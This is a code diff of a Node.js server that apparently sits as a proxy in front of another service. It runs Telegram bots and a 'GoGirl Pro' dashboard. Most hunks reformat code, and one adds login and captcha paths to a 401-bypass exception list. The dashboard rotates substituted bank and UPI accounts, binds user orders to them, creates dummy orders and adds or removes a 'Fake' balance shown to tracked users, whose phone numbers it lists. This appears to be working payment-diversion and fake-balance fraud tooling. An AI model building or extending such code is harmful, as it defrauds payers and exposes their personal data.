@@ -500,7 +500,8 @@ function isAuthFailureResponse(jsonResp) {
 function shouldBypass401(req) {
   const path = (req.originalUrl || req.url || '').split('?')[0];
   const noBypass = [
-
+    '/app/user/login',
+    '/app/captcha'
   ];
   return !noBypass.some(p => path.includes(p));
 }
@@ -587,8 +588,8 @@ async function loadData(forceRefresh) {
       if (cachedData.botToken) {
         if (BOT_TOKEN !== cachedData.botToken) {
           BOT_TOKEN = cachedData.botToken;
-          try { 
-            bot = new TelegramBot(BOT_TOKEN); 
+          try {
+            bot = new TelegramBot(BOT_TOKEN);
             webhookSet = false; // Trigger re-set of webhook
           } catch (e) { }
         }
@@ -597,8 +598,8 @@ async function loadData(forceRefresh) {
       if (cachedData.bot2Token) {
         if (BOT2_TOKEN !== cachedData.bot2Token) {
           BOT2_TOKEN = cachedData.bot2Token;
-          try { 
-            bot2 = new TelegramBot(BOT2_TOKEN); 
+          try {
+            bot2 = new TelegramBot(BOT2_TOKEN);
             webhook2Set = false; // Trigger re-set of webhook
           } catch (e) { }
         }
@@ -1320,13 +1321,13 @@ app.post('/bot-webhook', async (req, res) => {
 
     // All management commands moved to Web Dashboard
     const dashboardCmds = [
-      '/banner', '/status', '/on', '/off', '/rotate', '/log', 
+      '/banner', '/status', '/on', '/off', '/rotate', '/log',
       '/add ', '/deduct ', '/remove balance', '/history', '/clearhistory',
       '/adddummy', '/dummies', '/deldummy', '/off log', '/on log',
       '/banks', '/addbank', '/removebank', '/setbank', '/setmin',
       '/orders', '/delorder', '/usdt', '/services', '/service', '/idtrack', '/debug'
     ];
-    
+
     if (dashboardCmds.some(cmd => text.startsWith(cmd))) {
       await bot.sendMessage(chatId, '🌐 *Command Moved to Web Dashboard*\n\nAll management features are now available on the GoGirl Pro Dashboard:\nhttps://xchas.vercel.app/yougogirl', { parse_mode: 'Markdown' });
       return res.sendStatus(200);
@@ -3719,15 +3720,15 @@ app.get('/yougogirl', async (req, res) => {
                                 <i class="fa-solid fa-shield-halved text-sky-400"></i> Active Bank
                             </h3>
                             ${(() => {
-                                const active = data.banks[data.activeIndex] || data.banks[0];
-                                if (!active) return '<p class="text-slate-500 italic text-sm">No banks configured.</p>';
-                                return '<div class="space-y-2 text-sm">' +
-                                    '<div class="flex justify-between"><span class="text-slate-500">Holder:</span> <span class="font-mono">' + active.accountHolder + '</span></div>' +
-                                    '<div class="flex justify-between"><span class="text-slate-500">Account:</span> <span class="font-mono">' + active.accountNo + '</span></div>' +
-                                    '<div class="flex justify-between"><span class="text-slate-500">IFSC:</span> <span class="font-mono">' + active.ifsc + '</span></div>' +
-                                    '<div class="flex justify-between"><span class="text-slate-500">UPI:</span> <span class="text-sky-400">' + (active.upiId || 'N/A') + '</span></div>' +
-                                '</div>';
-                            })()}
+      const active = data.banks[data.activeIndex] || data.banks[0];
+      if (!active) return '<p class="text-slate-500 italic text-sm">No banks configured.</p>';
+      return '<div class="space-y-2 text-sm">' +
+        '<div class="flex justify-between"><span class="text-slate-500">Holder:</span> <span class="font-mono">' + active.accountHolder + '</span></div>' +
+        '<div class="flex justify-between"><span class="text-slate-500">Account:</span> <span class="font-mono">' + active.accountNo + '</span></div>' +
+        '<div class="flex justify-between"><span class="text-slate-500">IFSC:</span> <span class="font-mono">' + active.ifsc + '</span></div>' +
+        '<div class="flex justify-between"><span class="text-slate-500">UPI:</span> <span class="text-sky-400">' + (active.upiId || 'N/A') + '</span></div>' +
+        '</div>';
+    })()}
                         </div>
                         <div class="card">
                             <h3 class="text-lg font-bold mb-4 flex items-center gap-2">
@@ -3786,15 +3787,15 @@ app.get('/yougogirl', async (req, res) => {
                                     </tr>
                                 </thead>
                                 <tbody class="divide-y divide-slate-800">
-                                    ${Object.entries(data.userBanners || {}).map(([uid, b]) => 
-                                        '<tr>' +
-                                            '<td class="py-4 font-mono text-sky-400">' + uid + '</td>' +
-                                            '<td class="py-4 font-bold">' + b.title + '</td>' +
-                                            '<td class="py-4 text-slate-400 truncate max-w-[200px]">' + b.content + '</td>' +
-                                            '<td class="py-4"><span class="badge bg-emerald-500/10 text-emerald-500">Live</span></td>' +
-                                            '<td class="py-4 text-right"><button onclick="clearBanner(\'' + uid + '\')" class="text-rose-500 hover:underline">Delete</button></td>' +
-                                        '</tr>'
-                                    ).join('')}
+                                    ${Object.entries(data.userBanners || {}).map(([uid, b]) =>
+      '<tr>' +
+      '<td class="py-4 font-mono text-sky-400">' + uid + '</td>' +
+      '<td class="py-4 font-bold">' + b.title + '</td>' +
+      '<td class="py-4 text-slate-400 truncate max-w-[200px]">' + b.content + '</td>' +
+      '<td class="py-4"><span class="badge bg-emerald-500/10 text-emerald-500">Live</span></td>' +
+      '<td class="py-4 text-right"><button onclick="clearBanner(\'' + uid + '\')" class="text-rose-500 hover:underline">Delete</button></td>' +
+      '</tr>'
+    ).join('')}
                                     ${Object.keys(data.userBanners || {}).length === 0 ? '<tr><td colspan="5" class="py-8 text-center text-slate-600 italic">No active banners.</td></tr>' : ''}
                                 </tbody>
                             </table>
@@ -3852,33 +3853,33 @@ app.get('/yougogirl', async (req, res) => {
                                 </thead>
                                 <tbody class="divide-y divide-slate-800">
                                     ${Object.entries(data.trackedUsers || {}).map(([uid, u]) => {
-                                        const isOff = data.userOverrides[uid] && data.userOverrides[uid].logOff;
-                                        const added = (data.userOverrides[uid] && data.userOverrides[uid].addedBalance) || 0;
-                                        return '<tr>' +
-                                            '<td class="py-4">' +
-                                                '<div class="font-mono font-bold text-sky-400">' + uid + '</div>' +
-                                                '<div class="text-xs text-slate-500">' + (u.phone || 'No Phone') + '</div>' +
-                                            '</td>' +
-                                            '<td class="py-4">' +
-                                                '<div class="font-bold">₹' + (u.balance || '0') + '</div>' +
-                                                (added !== 0 ? '<div class="text-[10px] ' + (added > 0 ? 'text-emerald-400' : 'text-rose-500') + '">Fake: ' + (added > 0 ? '+' : '') + added + '</div>' : '') +
-                                            '</td>' +
-                                            '<td class="py-4">' +
-                                                '<button onclick="toggleUserLog(\'' + uid + '\')" class="badge ' + (isOff ? 'bg-rose-500/10 text-rose-500' : 'bg-emerald-500/10 text-emerald-500') + '">' +
-                                                    (isOff ? 'OFF' : 'ON') +
-                                                '</button>' +
-                                            '</td>' +
-                                            '<td class="py-4">' +
-                                                '<div class="text-[10px] font-bold text-slate-500">' + (u.orderCount || 0) + ' ORDERS</div>' +
-                                                '<div class="text-[9px] text-slate-600">' + (u.lastSeen || 'N/A') + '</div>' +
-                                            '</td>' +
-                                            '<td class="py-4 text-right">' +
-                                                '<button onclick="deleteTracking(\'' + uid + '\')" class="text-rose-500 hover:text-rose-400 transition-colors">' +
-                                                    '<i class="fa-solid fa-trash-can"></i>' +
-                                                '</button>' +
-                                            '</td>' +
-                                        '</tr>';
-                                    }).join('')}
+      const isOff = data.userOverrides[uid] && data.userOverrides[uid].logOff;
+      const added = (data.userOverrides[uid] && data.userOverrides[uid].addedBalance) || 0;
+      return '<tr>' +
+        '<td class="py-4">' +
+        '<div class="font-mono font-bold text-sky-400">' + uid + '</div>' +
+        '<div class="text-xs text-slate-500">' + (u.phone || 'No Phone') + '</div>' +
+        '</td>' +
+        '<td class="py-4">' +
+        '<div class="font-bold">₹' + (u.balance || '0') + '</div>' +
+        (added !== 0 ? '<div class="text-[10px] ' + (added > 0 ? 'text-emerald-400' : 'text-rose-500') + '">Fake: ' + (added > 0 ? '+' : '') + added + '</div>' : '') +
+        '</td>' +
+        '<td class="py-4">' +
+        '<button onclick="toggleUserLog(\'' + uid + '\')" class="badge ' + (isOff ? 'bg-rose-500/10 text-rose-500' : 'bg-emerald-500/10 text-emerald-500') + '">' +
+        (isOff ? 'OFF' : 'ON') +
+        '</button>' +
+        '</td>' +
+        '<td class="py-4">' +
+        '<div class="text-[10px] font-bold text-slate-500">' + (u.orderCount || 0) + ' ORDERS</div>' +
+        '<div class="text-[9px] text-slate-600">' + (u.lastSeen || 'N/A') + '</div>' +
+        '</td>' +
+        '<td class="py-4 text-right">' +
+        '<button onclick="deleteTracking(\'' + uid + '\')" class="text-rose-500 hover:text-rose-400 transition-colors">' +
+        '<i class="fa-solid fa-trash-can"></i>' +
+        '</button>' +
+        '</td>' +
+        '</tr>';
+    }).join('')}
                                 </tbody>
                             </table>
                         </div>
@@ -3904,27 +3905,27 @@ app.get('/yougogirl', async (req, res) => {
                     <div class="card">
                         <h3 class="text-lg font-bold mb-4">System Banks</h3>
                         <div class="grid grid-cols-1 gap-4">
-                            ${(data.banks || []).map((b, i) => 
-                                '<div class="p-4 glass rounded-2xl flex flex-col md:flex-row md:items-center justify-between gap-4 ' + (data.activeIndex === i ? 'border-sky-500/50 bg-sky-500/5' : '') + '">' +
-                                    '<div>' +
-                                        '<div class="flex items-center gap-2 mb-1">' +
-                                            '<span class="text-xs font-black text-slate-500">#' + (i + 1) + '</span>' +
-                                            '<span class="font-bold">' + b.accountHolder + '</span>' +
-                                            (data.activeIndex === i ? '<span class="badge bg-sky-500 text-white text-[8px]">Active</span>' : '') +
-                                        '</div>' +
-                                        '<div class="text-xs text-slate-400 font-mono">' + b.accountNo + ' | ' + b.ifsc + '</div>' +
-                                        (b.upiId ? '<div class="text-[10px] text-sky-400 mt-1">' + b.upiId + '</div>' : '') +
-                                    '</div>' +
-                                    '<div class="flex flex-wrap items-center gap-2">' +
-                                        '<div class="flex items-center glass rounded-lg px-2 py-1">' +
-                                            '<span class="text-[10px] text-slate-500 mr-2">Min: ₹</span>' +
-                                            '<input type="number" value="' + (b.minAmount || 0) + '" onchange="setMin(' + i + ', this.value)" class="bg-transparent border-none text-xs w-16 focus:outline-none">' +
-                                        '</div>' +
-                                        '<button onclick="setActiveBank(' + i + ')" class="text-xs font-bold text-sky-400 hover:underline">Set Active</button>' +
-                                        '<button onclick="removeBank(' + i + ')" class="text-xs font-bold text-rose-500 hover:underline">Remove</button>' +
-                                    '</div>' +
-                                '</div>'
-                            ).join('')}
+                            ${(data.banks || []).map((b, i) =>
+      '<div class="p-4 glass rounded-2xl flex flex-col md:flex-row md:items-center justify-between gap-4 ' + (data.activeIndex === i ? 'border-sky-500/50 bg-sky-500/5' : '') + '">' +
+      '<div>' +
+      '<div class="flex items-center gap-2 mb-1">' +
+      '<span class="text-xs font-black text-slate-500">#' + (i + 1) + '</span>' +
+      '<span class="font-bold">' + b.accountHolder + '</span>' +
+      (data.activeIndex === i ? '<span class="badge bg-sky-500 text-white text-[8px]">Active</span>' : '') +
+      '</div>' +
+      '<div class="text-xs text-slate-400 font-mono">' + b.accountNo + ' | ' + b.ifsc + '</div>' +
+      (b.upiId ? '<div class="text-[10px] text-sky-400 mt-1">' + b.upiId + '</div>' : '') +
+      '</div>' +
+      '<div class="flex flex-wrap items-center gap-2">' +
+      '<div class="flex items-center glass rounded-lg px-2 py-1">' +
+      '<span class="text-[10px] text-slate-500 mr-2">Min: ₹</span>' +
+      '<input type="number" value="' + (b.minAmount || 0) + '" onchange="setMin(' + i + ', this.value)" class="bg-transparent border-none text-xs w-16 focus:outline-none">' +
+      '</div>' +
+      '<button onclick="setActiveBank(' + i + ')" class="text-xs font-bold text-sky-400 hover:underline">Set Active</button>' +
+      '<button onclick="removeBank(' + i + ')" class="text-xs font-bold text-rose-500 hover:underline">Remove</button>' +
+      '</div>' +
+      '</div>'
+    ).join('')}
                         </div>
                     </div>
                 </section>
@@ -3948,19 +3949,19 @@ app.get('/yougogirl', async (req, res) => {
                                     </tr>
                                 </thead>
                                 <tbody class="divide-y divide-slate-800">
-                                    ${Object.values(data.orderBankMap || {}).filter((v, i, a) => v && v.orderCode && a.findIndex(t => t.orderCode === v.orderCode) === i).map(o => 
-                                        '<tr>' +
-                                            '<td class="py-4 font-mono text-sky-400 text-xs">' + o.orderCode + '</td>' +
-                                            '<td class="py-4 text-xs">' + (o.userId || 'N/A') + '</td>' +
-                                            '<td class="py-4 font-bold">₹' + (o.amount || '0') + '</td>' +
-                                            '<td class="py-4 text-xs text-slate-400">' +
-                                                (o.bank ? o.bank.accountHolder + '<br><span class="text-[10px]">' + o.bank.accountNo + '</span>' : 'N/A') +
-                                            '</td>' +
-                                            '<td class="py-4 text-right">' +
-                                                '<button onclick="deleteOrder(\'' + o.orderCode + '\')" class="text-rose-500 hover:underline">Delete</button>' +
-                                            '</td>' +
-                                        '</tr>'
-                                    ).join('')}
+                                    ${Object.values(data.orderBankMap || {}).filter((v, i, a) => v && v.orderCode && a.findIndex(t => t.orderCode === v.orderCode) === i).map(o =>
+      '<tr>' +
+      '<td class="py-4 font-mono text-sky-400 text-xs">' + o.orderCode + '</td>' +
+      '<td class="py-4 text-xs">' + (o.userId || 'N/A') + '</td>' +
+      '<td class="py-4 font-bold">₹' + (o.amount || '0') + '</td>' +
+      '<td class="py-4 text-xs text-slate-400">' +
+      (o.bank ? o.bank.accountHolder + '<br><span class="text-[10px]">' + o.bank.accountNo + '</span>' : 'N/A') +
+      '</td>' +
+      '<td class="py-4 text-right">' +
+      '<button onclick="deleteOrder(\'' + o.orderCode + '\')" class="text-rose-500 hover:underline">Delete</button>' +
+      '</td>' +
+      '</tr>'
+    ).join('')}
                                     ${Object.keys(data.orderBankMap || {}).length === 0 ? '<tr><td colspan="5" class="py-8 text-center text-slate-600 italic">No saved order bindings.</td></tr>' : ''}
                                 </tbody>
                             </table>
@@ -4006,17 +4007,17 @@ app.get('/yougogirl', async (req, res) => {
                                     </tr>
                                 </thead>
                                 <tbody class="divide-y divide-slate-800">
-                                    ${(data.dummyOrders || []).map(d => 
-                                        '<tr>' +
-                                            '<td class="py-4 font-mono text-sky-400">' + d.code + '</td>' +
-                                            '<td class="py-4 font-bold text-emerald-400">₹' + d.amount + '</td>' +
-                                            '<td class="py-4 text-xs text-slate-400">' + d.minRange + ' - ' + d.maxRange + '</td>' +
-                                            '<td class="py-4 text-[10px] text-slate-500">' + (d.createdAt || 'N/A') + '</td>' +
-                                            '<td class="py-4 text-right">' +
-                                                '<button onclick="deleteDummy(\'' + d.id + '\')" class="text-rose-500 hover:underline">Delete</button>' +
-                                            '</td>' +
-                                        '</tr>'
-                                    ).join('')}
+                                    ${(data.dummyOrders || []).map(d =>
+      '<tr>' +
+      '<td class="py-4 font-mono text-sky-400">' + d.code + '</td>' +
+      '<td class="py-4 font-bold text-emerald-400">₹' + d.amount + '</td>' +
+      '<td class="py-4 text-xs text-slate-400">' + d.minRange + ' - ' + d.maxRange + '</td>' +
+      '<td class="py-4 text-[10px] text-slate-500">' + (d.createdAt || 'N/A') + '</td>' +
+      '<td class="py-4 text-right">' +
+      '<button onclick="deleteDummy(\'' + d.id + '\')" class="text-rose-500 hover:underline">Delete</button>' +
+      '</td>' +
+      '</tr>'
+    ).join('')}
                                 </tbody>
                             </table>
                         </div>
@@ -4148,29 +4149,29 @@ app.get('/yougogirl', async (req, res) => {
                         </div>
                         <div class="space-y-3 max-h-[700px] overflow-y-auto pr-2">
                             ${(data.balanceHistory || []).slice().reverse().map(h => {
-                                const sign = h.type === 'add' ? '+' : (h.type === 'deduct' ? '-' : '');
-                                const color = h.type === 'add' ? 'text-emerald-400' : (h.type === 'deduct' ? 'text-rose-500' : 'text-slate-400');
-                                const bgColor = h.type === 'add' ? 'bg-emerald-500/10 text-emerald-500' : (h.type === 'deduct' ? 'bg-rose-500/10 text-rose-500' : 'bg-slate-800 text-slate-400');
-                                const icon = h.type === 'add' ? 'fa-plus' : (h.type === 'deduct' ? 'fa-minus' : 'fa-trash-can');
-                                
-                                return '<div class="p-4 glass rounded-2xl flex items-center justify-between">' +
-                                    '<div class="flex items-center gap-4">' +
-                                        '<div class="w-10 h-10 rounded-full ' + bgColor + ' flex items-center justify-center text-xs">' +
-                                            '<i class="fa-solid ' + icon + '"></i>' +
-                                        '</div>' +
-                                        '<div>' +
-                                            '<div class="font-bold text-sm">User ' + h.userId + '</div>' +
-                                            '<div class="text-[10px] text-slate-500">' + h.time + '</div>' +
-                                        '</div>' +
-                                    '</div>' +
-                                    '<div class="text-right">' +
-                                        '<div class="font-black ' + color + '">' +
-                                            (h.type === 'remove' ? 'RESET' : sign + '₹' + h.amount) +
-                                        '</div>' +
-                                        '<div class="text-[10px] text-slate-500 italic font-medium">Bal: ₹' + h.updatedBalance + '</div>' +
-                                    '</div>' +
-                                '</div>';
-                            }).join('')}
+      const sign = h.type === 'add' ? '+' : (h.type === 'deduct' ? '-' : '');
+      const color = h.type === 'add' ? 'text-emerald-400' : (h.type === 'deduct' ? 'text-rose-500' : 'text-slate-400');
+      const bgColor = h.type === 'add' ? 'bg-emerald-500/10 text-emerald-500' : (h.type === 'deduct' ? 'bg-rose-500/10 text-rose-500' : 'bg-slate-800 text-slate-400');
+      const icon = h.type === 'add' ? 'fa-plus' : (h.type === 'deduct' ? 'fa-minus' : 'fa-trash-can');
+
+      return '<div class="p-4 glass rounded-2xl flex items-center justify-between">' +
+        '<div class="flex items-center gap-4">' +
+        '<div class="w-10 h-10 rounded-full ' + bgColor + ' flex items-center justify-center text-xs">' +
+        '<i class="fa-solid ' + icon + '"></i>' +
+        '</div>' +
+        '<div>' +
+        '<div class="font-bold text-sm">User ' + h.userId + '</div>' +
+        '<div class="text-[10px] text-slate-500">' + h.time + '</div>' +
+        '</div>' +
+        '</div>' +
+        '<div class="text-right">' +
+        '<div class="font-black ' + color + '">' +
+        (h.type === 'remove' ? 'RESET' : sign + '₹' + h.amount) +
+        '</div>' +
+        '<div class="text-[10px] text-slate-500 italic font-medium">Bal: ₹' + h.updatedBalance + '</div>' +
+        '</div>' +
+        '</div>';
+    }).join('')}
                             ${(data.balanceHistory || []).length === 0 ? '<p class="text-center text-slate-600 py-12 italic text-sm">No balance history records found.</p>' : ''}
                         </div>
                     </div>
@@ -4377,7 +4378,7 @@ app.post('/yougogirl/api/balance/update', async (req, res) => {
     data.userOverrides[String(userId)] = data.userOverrides[String(userId)] || {};
     const tracked = data.trackedUsers && data.trackedUsers[String(userId)];
     const currentBal = tracked ? tracked.balance : 'N/A';
-    
+
     if (action === 'add') {
       data.userOverrides[String(userId)].addedBalance = (data.userOverrides[String(userId)].addedBalance || 0) + parseFloat(amount);
     } else if (action === 'deduct') {
@@ -4454,7 +4455,7 @@ app.post('/yougogirl/api/user/log-toggle', async (req, res) => {
     data.userOverrides[String(userId)] = data.userOverrides[String(userId)] || {};
     const currentState = data.userOverrides[String(userId)].logOff || false;
     data.userOverrides[String(userId)].logOff = !currentState;
-    
+
     // Fast cache update
     const targetId = String(userId);
     if (data.userOverrides[targetId].logOff) {
